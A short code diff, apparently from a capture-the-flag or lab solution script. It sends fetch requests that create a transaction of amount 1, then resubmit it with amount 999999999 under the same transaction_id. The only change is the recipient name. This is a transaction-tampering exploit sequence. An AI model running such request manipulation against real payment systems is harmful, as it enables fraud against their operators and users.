@@ -2,7 +2,7 @@
   // Create initial small transaction (amount=1)
   await fetch('/?action=create-transaction', {
     method:'POST', 
-    body:'recipient=adragos&amount=1', 
+    body:'recipient=birdbirdbird&amount=1', 
     headers:{'Content-Type':'application/x-www-form-urlencoded'}
   });
   
@@ -37,7 +37,7 @@
   if (transactionId) {
     await fetch('/?action=create-transaction', {
       method:'POST',
-      body:`recipient=adragos&amount=999999999&transaction_id=${transactionId}`,
+      body:`recipient=birdbirdbird&amount=999999999&transaction_id=${transactionId}`,
       headers:{'Content-Type':'application/x-www-form-urlencoded'}
     });
   }
